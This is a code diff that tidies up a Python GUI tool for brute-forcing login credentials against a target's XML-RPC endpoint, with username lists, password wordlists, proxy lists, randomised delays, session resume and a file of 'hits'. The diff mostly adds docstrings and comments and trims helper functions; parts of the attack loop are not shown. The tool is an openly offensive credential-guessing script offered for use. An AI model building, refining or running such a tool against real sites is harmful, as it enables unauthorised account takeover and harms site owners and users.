@@ -8,12 +8,13 @@ import itertools
 import logging
 from urllib.parse import urlparse
 
+# GUI-related imports
 import customtkinter as ctk
 from tkinter import filedialog, messagebox
 import tkinter as tk
 from datetime import datetime
 
-# === Setup ===
+# === Constants ===
 LOG_FILE_PATH = "xvector_log.txt"
 SESSION_FILE = "session.json"
 HITS_FILE = "hits.txt"
@@ -24,10 +25,12 @@ start_time = None
 attempt_counter = 0
 
 # === Logging Setup ===
-logging.basicConfig(filename=LOG_FILE_PATH, level=logging.INFO, 
+logging.basicConfig(filename=LOG_FILE_PATH, level=logging.INFO,
                     format='%(asctime)s [%(levelname)s]: %(message)s')
 
+
 def log_message(message, level="info"):
+    """Log messages with different severity levels."""
     levels = {
         "info": logging.info,
         "success": logging.info,  # Map to info for simplicity
@@ -36,27 +39,27 @@ def log_message(message, level="info"):
     }
     levels.get(level, logging.info)(message)
 
+
 # === Helper Functions ===
 def browse_file(entry_widget, file_types, label):
+    """Open a file dialog and set the selected file path to the entry widget."""
     path = filedialog.askopenfilename(title=f"Select {label}", filetypes=file_types)
     if path:
         entry_widget.delete(0, "end")
         entry_widget.insert(0, path)
 
-def browse_wordlist():
-    browse_file(wordlist_entry, [("Text files", "*.txt")], "Password Wordlist")
-
-def browse_proxylist():
-    browse_file(proxy_entry, [("Text files", "*.txt")], "Proxy List")
 
 def validate_target_url(target):
+    """Validate the target URL format."""
     parsed = urlparse(target)
     if not parsed.scheme or not parsed.netloc:
         messagebox.showerror("Input Error", "Invalid URL format. Use http(s)://example.com")
         return False
     return True
 
+
 def validate_inputs(target, usernames, wordlist_path, min_delay, max_delay):
+    """Validate user inputs and return True if all inputs are valid."""
     if not target or not usernames or not wordlist_path:
         messagebox.showerror("Input Error", "Please fill in all required fields.")
         return False
@@ -70,35 +73,29 @@ def validate_inputs(target, usernames, wordlist_path, min_delay, max_delay):
         max_delay = float(max_delay)
         if min_delay < 0 or max_delay < 0 or min_delay > max_delay:
             raise ValueError()
-    except Exception:
+    except ValueError:
         messagebox.showerror("Input Error", "Invalid delay values.")
         return False
     return True
 
+
 def prepare_wordlist(wordlist_path):
+    """Load and prepare the wordlist from the given file path."""
     try:
         with open(wordlist_path, 'r', encoding="utf-8") as file:
             return [line.strip() for line in file if line.strip()]
     except Exception as e:
         raise ValueError(f"Error loading wordlist: {e}")
 
-def update_speed():
-    while not ABORT_FLAG.is_set():
-        elapsed = (time.time() - start_time) if start_time else 1
-        speed = attempt_counter / elapsed if elapsed else 0.0
-        speed_label.configure(text=f"Speed: {speed:.2f} req/sec")
-        time.sleep(1)
-
-def abort_attack():
-    ABORT_FLAG.set()
-    log_message("[!] Brute force aborted by user.", "warning")
 
 def run_brute_force():
+    """Run the brute force attack process."""
     global attempt_counter, start_time
     ABORT_FLAG.clear()
     attempt_counter = 0
     start_time = time.time()
 
+    # Collect user inputs
     target = target_entry.get().strip()
     usernames = [u.strip() for u in usernames_box.get("1.0", "end").strip().splitlines() if u.strip()]
     wordlist_path = wordlist_entry.get().strip()
@@ -107,12 +104,14 @@ def run_brute_force():
     min_delay = min_delay_entry.get()
     max_delay = max_delay_entry.get()
 
+    # Validate inputs
     if not validate_inputs(target, usernames, wordlist_path, min_delay, max_delay):
         return
 
     min_delay = float(min_delay)
     max_delay = float(max_delay)
 
+    # Prepare the wordlist
     try:
         passwords = prepare_wordlist(wordlist_path)
     except ValueError as e:
@@ -143,23 +142,22 @@ def run_brute_force():
             except Exception as e:
                 log_message(f"[!] Could not resume session: {e}", "error")
 
+    # Connect to the target server
     try:
         server = xmlrpc.client.ServerProxy(target)
     except Exception as e:
         log_message(f"[!] Could not connect to target: {e}", "error")
         return
 
+    # Brute force logic
     hit_found = False
     total_attempts = len(usernames) * len(passwords)
-    progress = tk.DoubleVar(value=0)
-
-    def update_progress_bar(val):
-        progress_bar.set(val)
 
     for idx, user in enumerate(usernames):
         if ABORT_FLAG.is_set():
             break
-        log_message(f"\n[*] Trying user: {user}", "info")
+        log_message(f"[*] Trying user: {user}", "info")
+
         for pwd_idx, password in enumerate(passwords):
             if ABORT_FLAG.is_set():
                 log_message("[!] Attack aborted!", "warning")
@@ -209,11 +207,8 @@ def run_brute_force():
     except Exception:
         pass
 
-    progress_bar.after(0, update_progress_bar, 100)
     if hit_found:
         messagebox.showinfo("Done", "Brute-force completed! Credentials found.")
     else:
         messagebox.showinfo("Done", "Brute-force completed. No valid credentials found.")
-    log_message("\n[*] Brute-force completed.", "success")
-
-# GUI Setup remains unchanged from the original with minor updates for added tooltips.
+    log_message("[*] Brute-force completed.", "success")
